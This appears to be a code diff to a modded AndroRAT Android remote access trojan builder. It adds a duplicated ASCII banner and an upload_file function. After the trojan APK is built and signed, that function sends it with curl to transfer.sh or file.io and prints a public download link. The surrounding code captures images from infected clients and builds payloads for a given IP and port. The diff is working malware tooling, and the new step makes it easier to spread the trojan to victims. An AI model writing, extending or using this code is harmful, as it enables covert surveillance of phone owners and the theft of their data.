@@ -104,6 +104,24 @@ def help():
     """
     print(helper)
 
+#  _    _     _____      _       _
+# | |  / /   |  _  \    | |     | |
+# | | / /    | | |  |   | |_   _| |
+# | |/ /     | |_| /    |   \_/   |
+# |   |      |  __/     | |\   /| |
+# | |\ \     | |        | | \_/ | |
+# | | \ \    | |        | |     | |
+# |_|  \_\   |_|        |_|     |_|
+
+#  _    _     _____      _       _
+# | |  / /   |  _  \    | |     | |
+# | | / /    | | |  |   | |_   _| |
+# | |/ /     | |_| /    |   \_/   |
+# |   |      |  __/     | |\   /| |
+# | |\ \     | |        | | \_/ | |
+# | | \ \    | |        | |     | |
+# |_|  \_\   |_|        |_|     |_|
+# by kelompok KPM
 def getImage(client):
     print(stdOutput("info")+"\033[0mTaking Image")
     timestr = time.strftime("%Y%m%d-%H%M%S")
@@ -397,6 +415,47 @@ def build(ip,port,output,ngrok=False,ng=None,icon=None):
         else:
             print("\r"+resOut.stderr)
             print(stdOutput("error")+"Signing Failed")
+        upload_file(getpwd(outFileName))
     else:
         print("\r"+resOut.stderr)
         print(stdOutput("error")+"Building Failed")
+
+def prints(text):
+    for line in text:
+        print(line, end='', flush=True)
+        time.sleep(0.008)
+    print('')
+
+def upload_file(file):
+    w = '\033[0m'
+    r = '\033[1;91m'
+    g = '\033[1;92m'
+    y = '\033[1;33m'
+    b = '\033[1;94m'
+    d = '\033[90m'
+    # global variable
+    sara = f'{d}<{b}sara{d}>{w}'
+    user = f'{d}<{g}user{d}>{w}'
+    prints(f'''
+f'{d}<{b}AndroRAT Mod{d}>{w}' : do you want to upload \'{g}{file}{w}\' ?
+
+         (1) yes
+         (2) no
+    ''')
+    asks = str(input(f'{user} : '))
+    if asks in ('2', '02'): return False
+    text = f'{sara} : upload \'{d}{file}{w}\' into the link ...'
+    print(text + f'{y}wait{w}', end='\r')
+    link = os.popen(f'curl --upload-file {file} https://transfer.sh/{os.path.basename(file)} --silent', 'r').readline().strip()
+    if 'https' not in link:
+        try:
+            link = re.search('"link":"(.*?)"', os.popen(f'curl -F "file=@{file}" https://file.io --silent','r').read()).group(1)
+        except:
+            print(text + f'{r}fail{w}')
+            return False
+    print(text + f'{g}done{w}')
+    prints(f'''
+{sara} : your file has been successfully uploaded,
+         here is the download link ...
+
+         {y}{link}{w}''')
